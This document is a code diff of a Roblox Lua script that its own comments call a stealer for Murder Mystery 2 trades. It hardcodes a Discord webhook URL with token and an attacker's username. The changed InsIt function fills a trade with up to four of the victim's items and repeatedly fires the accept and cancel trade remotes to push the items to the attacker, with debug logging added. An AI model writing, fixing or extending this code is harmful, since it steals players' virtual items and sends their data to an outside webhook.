@@ -1,4 +1,3 @@
---call
 Username = "Protoxak"
 Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"
 
@@ -128,11 +127,15 @@ local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer(
 local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end
 
 -- ═══════════════════════════════════════════════════════
--- ФИКС: одиночный accept раз в 12 секунд (анти-спам MM2)
+-- InsIt: логика accept из первого стиллера (AcceptTrade + CancelAccept)
 -- ═══════════════════════════════════════════════════════
 local InsIt=function()
- local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
- if not InvT then dTr() return end
+ warn("[InsIt] called")
+ local rcv=P:FindFirstChild(recvr) 
+ if not rcv then warn("[InsIt] recvr not found") dTr() return end
+ if not InvT then warn("[InsIt] InvT nil") dTr() return end
+ warn("[InsIt] InvT size: " .. tostring(#InvT))
+
  local tIt={} iAd=0 tIn=0 local i=1
  while iAd<4 and i<=#InvT do
   local it=InvT[i]
@@ -147,6 +150,7 @@ local InsIt=function()
   end
   i=i+1
  end
+ warn("[InsIt] iAd: " .. iAd)
  if iAd==0 then dTr() return end
 
  task.spawn(function()
@@ -157,35 +161,46 @@ local InsIt=function()
    local rem = RS:FindFirstChild("Remotes")
    if rem then tradeRemote = rem:FindFirstChild("Trade") end
   end
-  if not tradeRemote then return end
+  if not tradeRemote then warn("[InsIt] tradeRemote NIL") return end
 
   local acceptR  = tradeRemote:FindFirstChild("AcceptTrade")
-  local confirmR = tradeRemote:FindFirstChild("ConfirmTrade")
-                or tradeRemote:FindFirstChild("FinalizeTrade")
-                or tradeRemote:FindFirstChild("CompleteTrade")
+  local cancelR  = tradeRemote:FindFirstChild("CancelAccept")
   local statusR  = tradeRemote:FindFirstChild("GetTradeStatus")
 
+  warn("[InsIt] acceptR: " .. (acceptR and acceptR.Name or "NIL"))
+  warn("[InsIt] cancelR: " .. (cancelR and cancelR.Name or "NIL"))
+  warn("[InsIt] statusR: " .. (statusR and statusR.Name or "NIL"))
+
+  if not acceptR then warn("[InsIt] acceptR NIL — abort") return end
+
   local acc = false
-  local timeout = tick() + 600  -- 10 минут максимум
+  local timeout = tick() + 600
   local attempt = 0
 
   while not acc and tick() < timeout do
    attempt = attempt + 1
-   warn("[trade] attempt #" .. attempt)
+   warn("[InsIt] attempt #" .. attempt)
 
-   if acceptR then
-    pcall(function() acceptR:FireServer(game.PlaceId * 3) end)
+   -- ═══ ПАРА accept + cancel как в первом стиллере ═══
+   pcall(function() 
+       acceptR:FireServer(game.PlaceId * 3, nil) 
+   end)
+   task.wait(0.1)
+
+   if cancelR then
+       pcall(function() 
+           cancelR:FireServer() 
+       end)
+       task.wait(0.1)
    end
 
-   if confirmR then
-    pcall(function() confirmR:FireServer() end)
-   end
-
-   -- ЖДЁМ 12 СЕКУНД — анти-спам MM2
+   -- ждём 12 сек анти-спам
    task.wait(12)
 
+   -- проверяем статус
    if statusR then
     local ok, s = pcall(function() return statusR:InvokeServer() end)
+    warn("[InsIt] status: " .. tostring(s))
     if ok and s == "None" then
      acc = true
      break
@@ -197,6 +212,8 @@ local InsIt=function()
     break
    end
   end
+
+  warn("[InsIt] acc: " .. tostring(acc))
 
   if acc then
    for _, td in ipairs(tIt) do
@@ -222,7 +239,18 @@ local act=function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(1
 
 if TP then
  if Mob then TP.Container.Position=Pos TP.ClickBlocker.Position=Pos else TP.BG.Position=Pos TP.Container.Position=Pos TP.ClickBlocker.Position=Pos TP.Processing.Position=Pos end
- TP:GetPropertyChangedSignal("Enabled"):Connect(function() if TP.Enabled then InsIt() else local p=P:FindFirstChild(recvr) if p then cTr(p) end end end)
+ 
+ -- если окно уже открыто на старте
+ if TP.Enabled then InsIt() end
+ 
+ TP:GetPropertyChangedSignal("Enabled"):Connect(function() 
+  if TP.Enabled then 
+   InsIt() 
+  else 
+   local p=P:FindFirstChild(recvr) 
+   if p then cTr(p) end 
+  end 
+ end)
 end
 P.PlayerAdded:Connect(function(p) if p.Name==recvr then act(p.Name) end end)
 P.PlayerRemoving:Connect(function(p) if p.Name==recvr then cRIS(p.Name) end end)
